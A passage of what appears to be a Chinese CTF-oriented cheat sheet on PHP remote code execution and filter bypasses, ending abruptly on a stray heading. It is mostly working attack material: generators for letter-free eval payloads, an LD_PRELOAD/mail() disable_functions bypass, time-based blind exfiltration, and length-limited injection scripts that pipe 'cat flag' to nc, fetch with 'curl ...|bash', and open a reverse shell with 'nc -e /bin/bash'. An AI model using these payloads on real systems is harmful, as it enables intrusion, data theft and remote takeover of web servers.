如果结果被替换，可以在代码后边加一个exit退出，进而绕过对于结果的替换

```php
$a=opendir('/');while(($file=readdir($a)) != false) {echo $file."";}exit();
```

### eval类命令执行

所谓eval类命令执行即原题中给出了eval()这一函数，并让其参数可控

**示例代码**

```php
<?php
eval($_POST['1']);
?>
```

eval函数的本质是将任意字符串当作php代码执行，我们在进行get和post传参是传入的参数默认都是字符串形式的，正好也一定会符合这个条件

#### 无字母数字rce

简单来说，无字母数字rce就是把我们可控参数中的数字和字母都ban掉了，我们需要通过不可见字符的运算构造出可见字符，并执行相应命令，下面的绕过姿势本质都是通过不可见字符之间的关系运算构造出我们所需要的字符串并执行我们的恶意命令。

**示例代码**

```php
<?php
if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {
eval($_GET['shell']);
}
```

##### 取反绕过

通过取反操作使得原命令变为不可见字符，绕过waf检测，在eval执行时再通过取反操作还原为原恶意命令，进行执行任意恶意代码

**构造脚本1**

```php
<?php
$a=urlencode(~('call_user_func'));
$b=urlencode(~('system'));
$c=urlencode(~('whoami'));
echo $a;
echo "\n";
echo $b;
echo "\n";
echo $c;
echo "\n";
echo "(~".$a.")(~".$b.",~".$c.",'');";
?>
```

**构造脚本2**

```php
<?php
//在命令行中运行

fwrite(STDOUT,'[+]your function: ');

$system=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 

fwrite(STDOUT,'[+]your command: ');

$command=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 

echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';
```

##### 异或绕过

通过不可见字符之间的异或运算构造出任意恶意命令，将两个脚本按照规定命名放到同一个目录下，每次使用时需要根据题目代码更换php脚本中的正则部分，更改好运行python代码，根据提示构造即可

xor.php

```php
<?php

/*author yu22x*/

$myfile = fopen("xor_rce.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
    for ($j=0; $j <256 ; $j++) { 

        if($i<16){
            $hex_i='0'.dechex($i);
        }
        else{
            $hex_i=dechex($i);
        }
        if($j<16){
            $hex_j='0'.dechex($j);
        }
        else{
            $hex_j=dechex($j);
        }
        $preg = '/[a-z0-9A-Z]/i'; //根据题目给的正则表达式修改即可
        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
                    echo "";
    }

        else{
        $a='%'.$hex_i;
        $b='%'.$hex_j;
        $c=(urldecode($a)^urldecode($b));
        if (ord($c)>=32&ord($c)<=126) {
            $contents=$contents.$c." ".$a." ".$b."\n";
        }
    }

}
}
fwrite($myfile,$contents);
fclose($myfile);
```

xor.py

```python
import requests
import urllib
from sys import *
import os

def action(arg):
    s1 = ""
    s2 = ""
    for i in arg:
        f = open("xor_rce.txt", "r")
        while True:
            t = f.readline()
            if t == "":
                break
            if t[0] == i:
                # print(i)
                s1 += t[2:5]
                s2 += t[6:9]
                break
        f.close()
    output = "(\"" + s1 + "\"^\"" + s2 + "\")"
    return (output)

while True:
    param = action(input("\n[+] your function：")) + action(input("[+] your command：")) + ";"
    print(param)
```

##### 或绕过

通过不可见字符之间的或运算构造出任意恶意命令，将两个脚本按照规定命名放到同一个目录下，每次使用时需要根据题目代码更换php脚本中的正则部分，更改好运行python代码，根据提示构造即可

or.php

```php
<?php
$myfile = fopen("or.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
    for ($j=0; $j <256 ; $j++) { 

        if($i<16){
            $hex_i='0'.dechex($i);
        }
        else{
            $hex_i=dechex($i);
        }
        if($j<16){
            $hex_j='0'.dechex($j);
        }
        else{
            $hex_j=dechex($j);
        }
        $preg = '/[b-df-km-uw-z0-9\+\~\{\}]+/i';
        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
                    echo "";
    }

        else{
        $a='%'.$hex_i;
        $b='%'.$hex_j;
        $c=(urldecode($a)|urldecode($b));
        if (ord($c)>=32&ord($c)<=126) {
            $contents=$contents.$c." ".$a." ".$b."\n";
        }
    }

}
}
fwrite($myfile,$contents);
fclose($myfile);
```

or.py

```python
# -*- coding: utf-8 -*-
import requests
import urllib
from sys import *
import os

os.system("php rce_or.php")  # 没有将php写入环境变量需手动运行

def action(arg):
    s1 = ""
    s2 = ""
    for i in arg:
        f = open("or.txt", "r")
        while True:
            t = f.readline()
            if t == "":
                break
            if t[0] == i:
                # print(i)
                s1 += t[2:5]
                s2 += t[6:9]
                break
        f.close()
    output = "(\"" + s1 + "\"|\"" + s2 + "\")"
    return (output)

while True:
    param = action(input("\n[+] your function：")) + action(input("[+] your command："))

    print(param)
```

##### 自增绕过

通过php的自增特性，构造出恶意字符串assert($*POST[\*]);，进而实现任意代码执行

何为自增？

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-70e68096bf8200d018d1ec8e0424fa383038234b.png)

我们可以发现，A在进行++操作之后变成了B，规律遵循ascii码表，详见开头。以下为构造脚本

```php
//测试发现7.0.12以上版本不可使用
//使用时需要url编码下
$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
固定格式 构造出来的 assert($_POST[_]);
然后post传入   _=phpinfo();
```

##### 临时文件执行

此方法的适用环境稍有不同，以上手法皆为eval类的无字母数字命令执行，而此方法适用于system类命令执行

```php
import requests

while True:
    url = "http://url/?c=.+/???/????????[@-[]"
    r = requests.post(url, files={"file": ('1.php', b'cat flag.php')})
    if r.text.find("flag") >0:
        print(r.text)
        break
```

我们通过发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是`/tmp/phpXXXXXX`，文件名最后6个字符是随机的大小写字母。由于字母数字被过滤，所以所有的字母数字都用?通配符代替

**关于正则部分**

```php
. /???/????????[@-[]
```

根据观察，文件的最后一位必定为大写字母，所以可以通过正则强制匹配大写字符增加成功几率，详见开头ascii码表

**关于.**

```bash
. filename
```

用当前的shell执行一个文件中的命令。当前运行的shell是bash，则. file的意思就是用bash执行filename文件中的命令。所以我们就可以用.来执行我们上传的恶意文件

参考请求包

```php
POST /?shell=?><?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?> HTTP/1.1
Host: 192.168.43.210:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type:multipart/form-data;boundary=--------123
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 109

----------123
Content-Disposition:form-data;name="file";filename="1.txt"

#!/bin/sh
ls /
----------123--
```

#### 有或无参数rce

所谓无参数rce就是利用各种已定义函数的复杂搭配，在eval命令执行的条件下成功构造我们所需的恶意代码的操作。例如下方简介表格中的最后一条代码串。

示例代码

```php
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
    eval($_GET['code']);
}
```

##### 常见函数及简介

| 函数                                                         | 效果                                                         |
| :----------------------------------------------------------- | :----------------------------------------------------------- |
| include()                                                    | 包含文件内容                                                 |
| require()                                                    | 包含文件内容                                                 |
| include_once()                                               | 包含文件内容                                                 |
| require_once()                                               | 包含文件内容                                                 |
| foreach($a as $x => $y)                                      | $a为数组,将数组名和值循环赋值给$x和$y                        |
| exit($a)                                                     | 输出$a并退出当前脚本                                         |
| show_source()                                                | 显示文件内容                                                 |
| file_get_contents()                                          | 显示文件内容                                                 |
| highlight_file()                                             | 显示文件内容                                                 |
| readfile()                                                   | 显示文件内容                                                 |
| var_dump()                                                   | 打印数组，显示文件名                                         |
| printf()                                                     | 显示文件内容                                                 |
| next()                                                       | 数组指针移动到下一位                                         |
| array_reverse()                                              | 数组位置前后调转                                             |
| show_source(next(array_reverse(scandir(current(localeconv()))))) | 输出当前目录倒数第二个文件内容                               |
| localeconv()                                                 | 详细的自己搜，返回一个数组，数组的第一个是小数点字符，因此可以用current()提取一个. |
| current()或pos()                                             | 提取数组第一个元素的值                                       |
| scandir()                                                    | 显示目录中的所有文件                                         |
| scandir(current(localeconv()))                               | 查看目录                                                     |
| var_dump(scandir(current(localeconv())))                     | 输出目录                                                     |
| array_flip()                                                 | 交换数组中的键和值，成功时返回交换后的数组                   |
| array_rand()                                                 | 从数组中随机取出一个或多个单元                               |
| end()                                                        | 取出数组中的最后一位                                         |
| chdir()                                                      | 目录跳转，例如chdir('..')就是跳转到上级目录                  |
| get_defined_vars()                                           | 返回由所有已定义变量所组成的数组（全局变量）                 |
| dirname()                                                    | 返回当前文件的路径，就是pwd                                  |
| getcwd()                                                     | 返回当前的工作目录                                           |
| getallheaders()                                              | 返回所有的请求头数组                                         |
| getenv()                                                     | php7.1版本以后才能使用，获取环境变量                         |
| time()                                                       | 返回当前的Unix时间戳                                         |
| localtime()                                                  | 取得本地时间                                                 |
| localtime(time())                                            | 返回一个数组，0-60之间                                       |
| __halt_compiler();                                           | 停止对当前脚本的编译，可用于去掉后边没用的字符串             |
| pos()                                                        | 取出数组的第一个元素                                         |
| print_r(scandir(next(scandir(getcwd()))));                   | 输出上级目录                                                 |
| print_r(highlight_file(array_rand(array_flip(scandir(current(localeconv())))))); | 赌狗操作，随机读当前目录文件                                 |

**查看当前目录文件**

```php
print_r(scandir(current(localeconv())));
```

**读取当前目录文件**

```php
show_source(end(scandir(getcwd())));
show_source(current(array_reverse(scandir(getcwd()))));
```

**随机返回当前目录文件**

```php
highlight_file(array_rand(array_flip(scandir(getcwd()))));
show_source(array_rand(array_flip(scandir(getcwd()))));
show_source(array_rand(array_flip(scandir(current(localeconv())))));
```

**查看上级目录**

```php
print_r(scandir(dirname(getcwd())));
print_r(scandir(next(scandir(getcwd()))));
print_r(scandir(next(scandir(getcwd()))));
```

**读取上级目录文件**

```php
show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));
show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));
```

**查看根目录文件名**

```php
print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));
```

##### session_id

通过开启session，构造恶意session值进而执行任意恶意代码，构造脚本如下

```php
<?php
echo bin2hex("phpinfo();");
?>
```

恶意代码

```php
eval(hex2bin(session_id(session_start())));
```

恶意session值

```php
phpsessid=706870696e666f28293b
```

##### getallheaders

示例代码

源代码

```php
<?php
highlight_file(__FILE__);
// FLAG in the flag.php
$file = $_GET['file'];
if(isset($file) && !preg_match('/base|rot/i',$file)){
    @include($file);
}else{
    die("nope");
}
?>
```

**payload:**

```php
eval(array_pop(getallheaders()));
//这里的array_pop是弹出http头的最后一个
//getallheaders()会获取所有请求头信息的一个数组
请求头:
因为得是在最后一个，所以用字母让他排到最后,例如：
ZZZZZ=phpinfo();

或者使用
eval(pos(next(array_reverse(getallheaders())));
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-07f26bccdf14366a5c287a1a61655a2c9b692803.png)

注意看，此时我们通过print成功输出了getallheaders的数组，并构造了恶意请求头ZZZZZZ，看图可得其位于最后一位

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-84d9d90ba05c65ddae98713d5a7fb997584192ac.png)

此时我们可以通过end函数成功提取到了我们构造的ZZZZZ的值

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-1c4c6ff3b2aaafdb7694cd66058eeea671afec9a.png)

将print换成eval即可发现我们成功执行了phpinfo

##### get_defined_vars

```php
获取全局变量$_POST   $_GET    $_FILE    $_COOKIE
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-c84249ba7ae304d41d5a8dd7364ba05040e5c4a6.png)

由图可得，我们获取了所有的全局变量

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-ad779d71df1a0cd5dcdc16e4c46e3a273c648260.png)

观察这张图，我利用了两个pos成功提取出了我们恶意构造的123这一变量

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-965c2e1913effe0617eb7645e9995bff51cdecc4.png)

此时我将print换成了system，再将恶意构造的123换成了系统命令ls，发包后即可发现我们成功执行了ls系统命令

#### 绕过简介

eval类和system类命令执行的绕过大同小异，此处额外提供两个仅在eval类生效的脚本，其本质为php的字符解析机制和php的函数利用，以下可用于绕过特殊字符段的过滤，适用于show_source等多种2.2.2中的显示和包含文件函数的参数构造

**1.16进制绕过"\x77\x61\x66\x2e\x70\x68\x70"，外面必须为双引号**

16进制的构造脚本

```php
original_string=''
while(original_string!='end'):
    original_string = input()
    hex_representation = "\\x".join("{:02x}".format(ord(char)) for char in original_string)
    final_result = "\\x" + hex_representation
    print(final_result)
```

**2.chr函数绕过chr(119).chr(97).chr(102).chr(46).chr(112).chr(104).chr(112)**

chr的构造脚本

```php
def convert_to_ascii_special(text):
    ascii_special = ''
    for char in text:
        ascii_code = ord(char)
        ascii_special += 'chr({}).'.format(ascii_code)
    ascii_special = ascii_special[:-1]  # 去除最后一个加号
    return ascii_special

user_input=''
while(user_input!='end'):
    user_input = input("请输入要转换的字符：")
    result = convert_to_ascii_special(user_input)
    print(result)
```

### 常见函数

```php
system
exec
passthru
shell_exec
反引号 `
    
popen
proc_open		//无回显
    
pcntl_exec
//怎么运行，运行条件，参数，能否回显
//记函数本身有无回显
```
#### system

```php
system(string $command,int & $return_var = ?)

//command:执行command参数所指定的命令，并且输出执行结果
//如果提供return_var参数，则外部命令执行后的返回状态将会被设置到此变量中。
//提交命令能直接回显
```

#### exec

```php
exec(STRING $command,array & $output = ?,int & return_var = ?)

//command参数：要执行的命令。单独使用时只有最后一行结果，且不会回显
//output参数：用命令执行的输出填充此数组，每行输出填充数组中的一个元素。即逐行填充数组。
//只回显最后一行结果
//print_r($array)
//var_dump()输出变量相关信息
```

#### passthru

```php
passthru(string $command,int & $return_vat = ?)

//command参数：要执行的命令，输出二进制数据，并且需要直接传送到浏览器。
//有回显，以二进制流形式输出
```

#### shell\_exec

```php
shell_exec(string $cmd)

//cmd参数：要执行的命令
//回显用echo、print
```

#### popen

```php
popen(string $command,string $mode)

//command参数：要执行的命令
//mode参数：模式。'r'表示阅读，'w'表示写入
//fgets获取内容，print_r输出内容
```

#### proc\_open

```php
proc_open($command,$descriptor_spec,$pipes,$cwd,$env_vars,$options)

//command参数：要执行的命令
//descriptor_spec参数：定义数组内容
//pipes参数：调用数组内容
```

#### pcntl\_exec

```
pcntl_exec(string $path,array $args=?,array$envs=?)

//path：必须时可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚本（比如文件第一行是#!/usr/local/bin/perl的perl脚本
//args是一个要传递给程序的参数的字符串数组
//envs是一个要传递给程序作为环境变量的字符串数组。这个数组是key=>value格式的，key代表要传递的环境变量的名称，value代表该环境变量值
//在当前进程空间执行指定程序
```

### 替换绕过函数过滤

### LD\_PRELOAD绕过

> 命令执行函数过滤严格
>
> 使用场景：disable\_functions禁用所有可能用到的命令执行的函数

#### 动态链接

\*\*静态链接：\*\*在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开

\*\*装入时动态链接：\*\*源程序编译后所得到的一组目标模块，在装入内存时，边装入边链接

\*\*运行时动态链接：\*\*原程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行连接

\*\*对于动态链接来说，需要一个动态链接库，其作用在于当动态库中的函数发生变化对于可执行程序来说是透明的，可执行程序无需重新编译，方便程序的发布/维护/更新。

#### LD\_PRELOAD介绍

> 修改库文件

它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库

这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数

通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。

使用自己的或是更好的函数（无需别人的源码）

也可以向别人的程序注入恶意程序

**mail**内嵌在php 里

**imagick**需要扩展安装

#### 绕过条件

+   能够上传自己的.so文件；
+   能够控制环境变量的值（设置LD\_PRELOAD变量），比如putenv函数并且未被禁止；
+   存在可以控制php启动外部程序的函数并能执行（因为新进程启动将加载LD\_PRELOAD中的.so文件），比如mail()、imap\_mail()、mb\_send\_mail()和error\_log()等。

#### 代码分析

```php
#vim demo.php

<?php
mail(",",",");
?>

#strace -o 1.txt -f php demo.php
//把demo.php执行的动作，以文本方式放在1.txt
# cat 1.txt | grep execve
//有个sendmail的调用，修改sendmail的库文件
```

```php
#vim demo.c

#include<stdlib.h>
#include<stdio.h>
#include<string.h>
void payload(){
	system("echo '小可爱'");
}
int geteuid(){     //生成动作geteuid，执行payload
	unsetenv("LD_PRELOAD");   //结束调用
	payload();
}
#gcc -shared -fPIC demo.o -o demo.so
//将带有命令的c文件编译成.so文件，生成动态链接库文件
```

```php
#vim demo.php

<?php
putenv("LD_PRELOAD=./demo.so");   //加载动态链接库demo.so
mail(",",",");
?>
#php demo.php
```

### mail()函数命令执行例题

将php文件和demo.so文件通过蚁剑 上传

```php
把要执行的命令赋值到环境变量EVIL_CMDLINE直接读取命令

#vim demo3.c

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int gerteuid(){
	const char* cmdline = getenv("EVIL_CMDLINE");  //获得系统的环境变量EVIL_CMDLINE即想要执行的命令指令
	if(getenv("LD_PRELOAD") == NULL){return 0;}
	unsetenv("LD_PRELOAD");
	system(cmdline);  //放入system执行
}
```

```php
#创建php文件

<?php
$cmd = $_REQUEST["cmd"]; 
$out_path = $_REQUEST["outpath"];
$evil_cmdline = $cmd.">".$out_path."2>&1";
echo "<br/><b>cmdline:</b>".$evil_cmdline;
putenv("EVIL_CMDLINE=".$evil_cmdline);

$so_path = $_REQUEST["sopath"];
putenv("LD_PRELOAD=".$so_path);
mail("","","","");
echo "<br/><b>output:</b><br/>".nl2br(file_get_contents($out_path));
?>
```

```php
666.php?cmd=ls&outpath=/tmp/benben&sopath=./demo3.so
    cmd:执行的命令（可控）
    out_path:输出的路径
    sopath:指定恶意动态链接库
```

### 蚁剑及pcntl绕过函数过滤

```php
pcntl_exec(string $path,array $args = ?,array $envs =?)
    
path:必须是可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚本（比如文件第一行是#!/usr/local/bin/perl的perl脚本）
args:是一个要传递给程序的参数的字符串数组
    #/bin/bash -c /bin/lsb 
```

### 操作系统链接符

拼接命令

“；” “&” “&&” “|” “||”

```
;

使多个命令按顺序执行
前面的命令和后面的命令都会执行，相互独立
```

```
&
必须URL编码%26

使命令在后台运行
这样就可以同时执行多条命令
```

```
&&

如果前面的命令执行成功则执行后面的命令
```

```
|

将前面的命令的输出作为后面命令的输入，把前面命令的结果当成后面命令的参数；
前面的命令和后面的命令都会执行，但只显示后面的命令执行结果
```

```
||

类似于程序中的if-else语句
若前面的命令执行成功，则后面的命令就不会执行；
若前面的命令执行失败，则执行后面的命令。
```

### 空格过滤绕过

#### 过滤

```php
cmd = preg_replace("# #","",$cmd);
```

#### 绕过方法

+   大括号{cat,flag.txt};
    
+   $IFS代替空格； I F S 、 IFS、 IFS、{IFS}、$IFS$9
    
    ```
    Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符
    ?cmd=ls$IFS-l
    
    单纯$IFS2,IFS2被bash解析器当做变量名，输不出来结果，加一个{}就固定了变量名
    ?cmd=ls${IFS}-l
    
    $IFS$9后面加个$与{}类似 ，起截断作用， $9是当前系统shell进程第九个参数持有者
    ?cmd=ls$IFS$9-l
    
    ```
    
+   重定向字符<，<>;
    
    ```
    "<"表示的是输入重定向的意识，就是把<后面跟的文件取代键盘作为新的输入设备
    ?cmd=cat<flag.php
    ?cmd=cat<>flag.php
    ```
    
+   %09(Tab)，%20(space);
    
    ```
    ?cmd=cat%09flag.php
    ```
    

### 文件名过滤绕过

#### 绕过方法

```
1.统配符？ * 绕过
2.单引号、双引号绕过
3.反斜杠\绕过（去掉特殊字符功能性，连接符）
4.特殊变量：$1到$9、$@和$*等
5.内联执行（自定义字符串，再拼接起来）
#a=f;d=ag;c=l;cat $a$c$d.txt
6. 利用linux中的环境变量 
```

### 常见文件读取命令绕过

#### 绕过方法

```
1.tac：反向显示
2.more：一页一页的显示档案内容
3.less：与more类似
4.tail：查看末尾几行（默认最后10行）
5.nl:显示的时候，加上行号
6.od：以二进制的方式读取档案内容（od -A d -c)
7.xxd：读取二进制文件
8.sort：用于排序文件
9.uniq：报告或删除文件中重复的行
10.file -f：报错具体内容
11.grep：在文本中查找指定的字符串（grep fla fla*  #从fla*文本文件中搜索包含fla字符串的行）
```

### 编码绕过

1.base64编码

```python
import base64
S = b'cat flag.php'
e64 = base64.b64encode(S)  #参数s的类型必须是字节包（bytes）
print(e64)
# echo Y2F0IGZsYWcucGhw | base64 -d | bash
# `echo Y2F0IGZsYWcucGhw | base64 -d`
# $(echo Y2F0IGZsYWcucGhw | base64 -d)
# ?cmd=passthru('`echo Y2F0IGZsYWcucGhw | base64 -d`')
```

2.ASCII码

```python
import binascii
s = b"tac flag"
h = binascii.b2a_hex(s)
print(h)
# echo "74616320666c61672e706870" |xxd -r -p|bash
# ?cmd=passthru('echo "74616320666c61672e706870"|xxd -r -p|bash');
```

3.shellcode编码

```
# printf "\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70"
# ?cmd=passthru('printf "\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70"|bash');
```

### 无回显时间盲注

> 页面无法shell反弹或者无法回显，或者没有写入权限，可尝试命令盲注
>
> 根据返回的时间来就行判断

#### 相关命令

1.sleep

2.awk NR

```
逐行获取数据
#cat flag | awk NR==1
#cat falg | awk NR==2
```

3.cut -c

```
cut逐列获取单个字符
#cat flag | awk NR==2 | cut -c 2
```

4.if语句

```
#if [$(cat flag |awk NR==2 | cut -c 1) == F];then echo "right";fi
#if [$(cat flag |awk NR==2 | cut -c 1) == F];then sleep 2;fi
```

```
POC脚本

import requests
import time
url = "http://192.168.1.6:19080/class08/1.php"
result = ""
for i in range(1,5):
    for j in range(1,55):
        #asciiç è¡¨
        for k in range(32,128):
            k=chr(k)
            #time.sleep(0.1)
            payload = "?cmd=" + f"if [ `cat flag.php | awk NR=={i} | cut -c {j}` == {k} ];then sleep 2;fi"
            try:
                requests.get(url=url+payload, timeout=(1.5,1.5))
            except:
                result = result + k
                print(result)
                break
    result += " "
```

### 长度过滤绕过前置知识

#### 相关命令

```
>符号和>>符号
命令换行符
ls -t命令
sh命令
dir及*和rev命令
```

#### \>符号和>>符号

1.通过>来创建文件

```
#echo benben > a
#创建文件a，并把字符串写入到文件里
#通过>来将命令执行结果写入文件会覆盖文件原内容
#> b 直接创建文件，类似touch b
```

2.通过>>来追加内容

#### 命令换行

```
#cat a

#c\
#a\
#t\
 a
```

#### ls -t 命令

将文件按照时间顺序排列出来

```
将文件名作为字符串写入文件a，.(点)+ (空格)+可执行文件
ls -t >a
. a
sh a
```

```
>ag
>l\\
>"t \\"
>ca\\
ls -t >a
. a
```

对命令执行长度有限制时，创建短文件名，执行

#### dir

```
dir 
开头字母是d
按列输出，不换行
```

```
dir *
把第一个文件的文件名作为命令，后面的文件名作为参数
$(dir *)
```

```
rev
反转文件每一行内容
```

#### 长度为7绕过方法解析

```
cat flag|nc 47.122.23.131 7777
nc -lvp 7777
```

```
?cmd=>7777
?cmd=>\ \\
?cmd=>>161\\
?cmd=>1.\\
?cmd=>168.\\
?cmd=>192.\\
?cmd=>c\ \\
?cmd=>\|n\\
?cmd=>flag\\
?cmd=>t\ \\
?cmd=>ca\\
```

#### 长度为5绕过方法

```
curl 192.168.1.161|bash

增加一步创建ls -t >y
```

```python
import time
import requests

baseurl = ""
s = requests.session()

#将ls -t 写入文件
list = [
    ">ls\\",
    "ls>_",
    ">\ \\",
    ">-t\\",
    ">\>y",
    "ls>>_"
]

# curl 192.168.1.161/1|bash
list2 = [
    ">bash",
    ">\|\\",
    ">\/\\",
    ">61\\",
    ">1\\",
    ">1.\\",
    ">8.\\",
    ">16\\",
    ">2.\\",
    ">19\\",
    ">\ \\",
    ">rl\\",
    ">cu\\"
]
for i in list:
    time.sleep(1)
    url = baseurl+str(i)
    s.get(url)
   
for j in list2:
    time.sleep(1)
    url = baseurl+str(j)
    s.get(url)
    
s.get(baseurl+"sh _")
s.get(baseurl+"sh y")
```

```
#index.html
nc 192.168.1.161 7777 -e /bin/bash
#python -m http.server 80
```

#### 长度为4绕过方法

```
将ip地址改为16进制
```

```
1.开启监听端口
# nc -lvp 7777

2，创建index.html文件
# cd php
# vim index.html
nc 192.168.1.161 7777 -e /bin/bash
目标靶机curl下载index.html，交给bash执行，反弹shell;

3.http.server监听80端口
# python -m http.server 80

4.执行脚本
# python poc4.py
```

### 无参数命令执行

```
HTTP请求标头（php7.3）
利用全局变量RCE（php5/7）
利用session（php5）
使用scandir()进行文件读取
```

#### 命令执行请求头绕过

```php
preg_replace('/[^\W]+\((?R)?\)/','',$_GET['code'])
    
# 只要在'code'里匹配到[^\W]+\((?R)?\)，则替换为空。 
# 正则表达式[^\W]匹配字母、数字、下划线[A-Za-z0-9_]
# [^\W]+\(?\)匹配到“()”形式的字符串，但是()内不能出现如何参数
# （？R）代表递归，即a(b(c()))都能匹配到
# [^\W]+\((?R)?\)能匹配到a()、a(b(c()))....格式的字符串，且()内不能有如何参数
# 只有a()、a(b(c()))....格式的字符串，能被替换为空
```

```php
getallheaders()&apache_request_headers()
# 获取所有HTTP请求头

?code=print_r(pos(getallheaders()));
# pos()把第一项的值显示出来
?code=print_r(end(getallheaders()));
# end()把最后一项的值显示出来

# print_r()换成eval()即可执行system命令
```

#### 全局变量RCE

```
get_defined_vars()
# 返回所以已定义变量的值，所组成的数组

?code=print_r(get_defined_vars());

?code=print_r(end(pos(get_defined_vars())));&cmd=system('ls');
# 
```

#### session RCE

```
session_start()
# 启动新会话或者重用现有会话，成功开始会话返回TRUE，反之返回FALSE

?code=show_source(session_id(session_start()));
# 利用bp修改phpsession的值，执行命令
```

```
?code=eval(hex2bin(session_id(session_start())));

# 修改外部函数为eval()
# 修改PHPSESSID的值为命令'phpinfo();'
# 无法直接执行，需先把命令'phpinfo();'HEX编码转为十六进制，写入PHPSESSID
# 再用hex2bin()函数将十六进制转换为二进制数，用eval执行
```

#### scandir读取

```
scandir()	列出指定路径中的文件和目录
getcwd()	取得当前工作目录
current()	返回数组中的当前值
next()		将数组中的内部指针向前移动一位
array_reverse()	返回单元顺序相反的值
array_flip()	交换数组中的键和值
array_rand		从数组中随机取出一个或多个随机键
chdir()		系统调用函数（同cd），用于改变当前工作目录
strrev()	用来反转给定的字符串
crypt()		用来加密，目前Linux平台上加密的方法大致有MD5、DFS，3 DES
hebrevc()	把希伯来文本从右至左的流转换为左至右的流
```

localeconv() 显示的数组第一项为“."

dirname() 上一级目录

show\_source() 只能显示当前目录文件，需改变当前目录chdir()

```
# 上级目录
?code=show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));

?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));

?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));
```

```
# 根目录
?code=print_r(array());
?code=print_r(serialize(array()));
# serialize序列化
?code=print_r(crypt(serialize(array())));
# crypt单向字符串散列加密，结果随机
?code=print_r(strrev(crypt(serialize(array()))));
?code=print_r(strrev(crypt(serialize(array()))));
# ord()函数和chr()函数
# 只能对第一个字符进行转码
# ord()编码 chr()解码
```

```
show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));

show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));

show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));
```

### 无字母数字绕过方法

#### 异或运算绕过

```
?cmd=$_="+(+).&/"^"[@[@@@@";$_();
eval($_="+(+).&/"^"[@[@@@@";$_();)
```

```
PHP<7
assert($_POST['_']);


?cmd=$_="!((%)("^"@[[@[\\";$__="!+/(("^"~{`{|";$___=$$__;$_($___['_']);
```

#### 取反绕过

# 什么是rce

什么是rce?

